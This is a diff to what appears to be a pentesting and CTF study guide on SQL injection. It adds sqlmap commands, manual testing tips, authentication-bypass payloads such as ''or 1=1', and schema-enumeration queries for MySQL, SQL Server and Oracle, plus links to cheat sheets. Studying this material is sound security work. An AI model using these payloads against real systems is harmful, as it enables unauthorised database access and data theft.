@@ -293,6 +293,9 @@ Using jsql
 Crawl a page to find sql-injections
 
     sqlmap -u http://example.com --crawl=1
+Used captured HTTP request (use Burp proxy)   
+
+    sqlmap -r sqli.txt   
 Custom SQLi
     sqlmap -u --data="query" -D [database name] --tables --threads 5 
     
@@ -308,12 +311,15 @@ Capture the request using burp suite, and save the request in a file.
     sqlmap -r request.txt
 
 
-### Manual Testing 
+### Manual Testing    
+try single quote, then double quote, then try with comments    
+comments   
+
 For a row 
 
-    http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8
+    http://target-ip/inj.php?id=1 union all select 1,2,3,4,5,6,7,8    
     
-Login bypass
+Testing Payloads    
 
     'or 1=1- -
     ' or '1'=1
@@ -365,6 +371,21 @@ Using error-bases DB enumeration
 Using order by
 https://sushant747.gitbooks.io/total-oscp-guide/sql-injections.html
 
+Figuring out schema   
+MySQL:   
+Databases: SELECT schema_name FROM information_schema.schemata   
+Tables: SELECT table_name FROM information_schema.tables   
+Columns: SELECT column_name FROM information_schema.columns   
+
+MS SQL Server:   
+Note: information_schema can be used for MS SQL Server as well, with some slight, but significant, differences. The queries will need to explicitly reference individual databases because information_schema is a view that provides only info on the current database. Databases: SELECT name FROM sys.databases   
+Tables: SELECT name FROM sys.tables    
+Columns: SELECT name FROM sys.columns    
+
+Oracle:   
+Schemas: SELECT owner FROM all_tables   
+Tables: SELECT table_name FROM all_tables   
+Columns: SELECT column_name FROM all_tab_columns   
 	 
  SQL Injection Webshells
  
@@ -390,6 +411,10 @@ Example SQLi on Windows:
 ## Cheat Sheets 
 [SQLi cheat sheet](https://guif.re/sqli)  
 [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/Glossary.html)    
+https://websec.ca/kb/sql_injection   
+https://pentestmonkey.net/category/cheat-sheet/sql-injection   
+https://sqlwiki.netspi.com/    
+https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/    
 
 ## Further Reading 
 [OWASP Web App Testing Guide](https://owasp.org/www-project-web-security-testing-guide/stable/)    
@@ -400,13 +425,10 @@ File Inclusion
 [RFI to LFI](https://outpost24.com/blog/from-local-file-inclusion-to-remote-code-execution-part-1) 
 
 Basic SQLi 
-http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html  
-
-http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html  
-
-http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html  
-
-http://www.sqlinjection.net/login/
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-1-Basic-of-SQL-for-SQLi.html     
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-2-Basic-of-SQL-for-SQLi.html       
+http://www.securityidiots.com/Web-Pentest/SQL-Injection/Part-3-Basic-of-SQL-for-SQLi.html      
+http://www.sqlinjection.net/login/    
 
 ## Sources 
 https://fareedfauzi.gitbook.io/ctf-checklist-for-beginner/web 
